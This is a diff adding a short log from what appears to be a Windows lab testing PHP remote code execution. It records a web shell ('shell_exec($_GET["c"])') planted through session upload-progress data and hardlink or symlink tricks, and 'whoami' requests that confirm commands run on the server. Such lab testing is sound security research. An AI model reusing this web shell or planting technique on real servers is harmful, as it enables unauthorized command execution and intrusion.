@@ -1,0 +1,12 @@
+--- X1 plant (filtered token): EXISTS size=0 nlink=2 head=
+link owner: RASPUTIN\andre
+shell after: EXISTS size=455 nlink=2 head=upload_progress_<?php echo "WP4_RCE_OK[".shell_exec($_GET["c
+shell owner: RASPUTIN\andre
+--- X1b GET /empty.php?c=whoami
+upload_progress_WP4_RCE_OK[andre
+]|a:5:{s:10:"start_time";i:1792810850;s:14:"content_length";i:65776;s:15:"bytes_process
+--- X3 plant (filtered token, Dev Mode): SYMLINK->/c/Users/andre/Downloads/php2shell-claude/wp4/win_lab/x1/docroot/shell9.php
+shell after: EXISTS size=455 nlink=1 head=upload_progress_<?php echo "WP4_RCE_OK[".shell_exec($_GET["c
+--- X3b GET /shell9.php?c=whoami
+upload_progress_WP4_RCE_OK[andre
+]|a:5:{s:10:"start_time";i:1792810851;s:14:"content_length";i:65776;s:15:"bytes_process
